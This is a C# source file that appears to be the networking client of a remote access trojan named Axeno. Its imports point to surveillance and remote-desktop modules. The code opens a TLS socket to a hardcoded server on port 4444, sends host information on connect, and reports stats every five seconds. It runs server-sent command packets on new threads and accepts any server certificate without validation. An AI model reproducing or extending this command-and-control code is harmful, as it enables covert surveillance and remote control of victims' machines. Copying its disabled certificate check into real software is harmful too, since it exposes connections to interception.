using Axeno.Client.Properties;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography.X509Certificates;
using System.IO;
using Axeno.Client.Helper;
using System.Timers;
using Axeno.Client.Networking.Functions;
using Axeno.Client.Networking.Functions.Surveillence;

namespace Axeno.Client.Networking
{
    public static class ClientSocket
    {
        public static Socket Socket { get; set; }
        public static SslStream SslClient { get; set; }
        private static byte[] Buffer { get; set; }
        private static long HeaderSize { get; set; }
        private static long Offset { get; set; }
        public static bool IsConnected { get; set; }
        public static System.Timers.Timer pingTimer = new System.Timers.Timer();

        private readonly static ConcurrentQueue<byte[]> commandQueue = new ConcurrentQueue<byte[]>();
        private readonly static object queueLock = new object();
        private static bool isProcessingQueue = false;

        public static void CheckAndSend(object source, ElapsedEventArgs e)
        {
            if (!CheckConnection())
            {
                RemoteDesktop.streaming = false;
                IsConnected = false;
                pingTimer.Stop();
                return;
            }
            QueueCommand(ClientControl.UpdateStats());
        }

        public static void QueueCommand(byte[] command)
        {
            commandQueue.Enqueue(command);
            ProcessCommandQueue();
        }

        private static void ProcessCommandQueue()
        {
            lock (queueLock)
            {
                if (isProcessingQueue || commandQueue.IsEmpty)
                    return;

                isProcessingQueue = true;

                while (commandQueue.TryDequeue(out byte[] command))
                {
                    Send(command);
                }

                isProcessingQueue = false;
            }
        }

        public static void Connect()
        {
            try
            {
                ClientControl.GetExistingUID();

                Socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };
                string ServerIPstr = "127.0.0.1";
                int ServerPort = 4444;
                IPAddress serverIP = IPAddress.Parse(ServerIPstr);
                Socket.Connect(serverIP, ServerPort);
                if (Socket.Connected)
                {
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(Socket, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(Socket.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                    HeaderSize = 4;
                    Offset = 0;
                    Buffer = new byte[HeaderSize];
                    QueueCommand(SendInfo.GetAndSendInformation());
                    pingTimer.Elapsed += new ElapsedEventHandler(CheckAndSend);
                    pingTimer.Interval = 5000;
                    pingTimer.Enabled = true;
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        public static void ReadServerData(IAsyncResult ar)
        {
            try
            {
                if (!Socket.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }
                int received = SslClient.EndRead(ar);
                if (received > 0)
                {
                    Offset += received;
                    HeaderSize -= received;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        return;
                    }
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            try
            {
                if (!IsConnected)
                {
                    return;
                }

                byte[] bufferSize = BitConverter.GetBytes(msg.Length);
                Socket.Poll(-1, SelectMode.SelectWrite);
                SslClient.Write(bufferSize, 0, bufferSize.Length);

                if (msg.Length > 1000000)
                {
                    using (MemoryStream memoryStream = new MemoryStream(msg))
                    {
                        int read = 0;
                        memoryStream.Position = 0;
                        byte[] chunk = new byte[50 * 1000];
                        while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                        {
                            Socket.Poll(-1, SelectMode.SelectWrite);
                            SslClient.Write(chunk, 0, read);
                            SslClient.Flush();
                        }
                    }
                }
                else
                {
                    Socket.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(msg, 0, msg.Length);
                    SslClient.Flush();
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public static bool CheckConnection()
        {
            try
            {
                return !(Socket.Poll(1, SelectMode.SelectRead) && Socket.Available == 0);
            }
            catch (SocketException) { return false; }
        }
    }
}
